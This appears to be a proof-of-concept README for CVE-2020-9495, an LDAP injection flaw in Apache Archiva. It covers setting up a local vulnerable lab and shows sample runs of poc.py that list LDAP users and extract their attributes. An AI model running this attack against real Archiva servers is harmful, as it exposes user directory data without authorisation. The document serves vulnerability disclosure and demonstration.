# CVE-2020-9495 PoC

CVE-2020-9495 is medium severity LDAP injection vulnerability in [Apache Archiva](https://archiva.apache.org/) versions before 2.2.5. It allows an attacker to retrieve any LDAP attribute values of users that exist on the LDAP server.

From the official Apache Archiva [advisory](https://archiva.apache.org/security.html#CVE-2020-9495):

> By providing special values to the archiva login form a attacker is able to retrieve user attribute data from the connected LDAP server. With certain characters it is possible to modify the LDAP filter used to query the users on the connected LDAP server. By measuring the response time, arbitrary attribute data can be retrieved from LDAP user objects.

## PoC

The [poc.py](poc.py) script demonstrates how an unauthorized attacker can enumerate users on LDAP server integrated with Archiva and fetch the value of any attribute of any user.

### Local Archiva test server

Skip this step if you already have an Archiva server with enabled LDAP authentication.

1. Download Archiva 2.2.4 and extract it

   ```shell
   $ wget https://archive.apache.org/dist/archiva/2.2.4/binaries/apache-archiva-2.2.4-bin.tar.gz
   $ tar -zxf apache-archiva-2.2.4-bin.tar.gz

2. Run OpenLDAP server

   ```shell
   $ docker run -p 2389:389 --name my-openldap-container osixia/openldap:1.3.0
   ```

3. Import users from [users.ldif](users.ldif) to LDAP

   ```shell
   $ ldapadd -x -D "cn=admin,dc=example,dc=org" -w admin -H ldap://localhost:2389 -f users.ldif
   ```

4. Run Archiva server

   ```shell
   $ bin/archiva console
   ```

5. Enable and configure LDAP authentication via web interface

### Enumerate users

```shell
$ ./poc.py --url http://127.0.0.1:8080
[INFO] Enumerating users from http://127.0.0.1:8080
[INFO] Calibration...
[INFO] Calibration done
admin1
admin2
admin3
admin4
admin5
admin6
admin7
user1
user2
user3
user4
```

### Retrieve LDAP attributes' values of `admin1` user

```shell
$ ./poc.py --url http://127.0.0.1:8080 --user admin1 --attr mail
[INFO] Exfiltrating mail attribute of admin1 user from http://127.0.0.1:8080
[INFO] Calibration...
[INFO] Calibration done
admin1@example.com
$ ./poc.py --url http://127.0.0.1:8080 --user admin1 --attr givenName
[INFO] Exfiltrating givenName attribute of admin1 user from http://127.0.0.1:8080
[INFO] Calibration...
[INFO] Calibration done
admin1
$ ./poc.py --url http://127.0.0.1:8080 --user admin1 --attr sn
[INFO] Exfiltrating sn attribute of admin1 user from http://127.0.0.1:8080
[INFO] Calibration...
[INFO] Calibration done
last
```
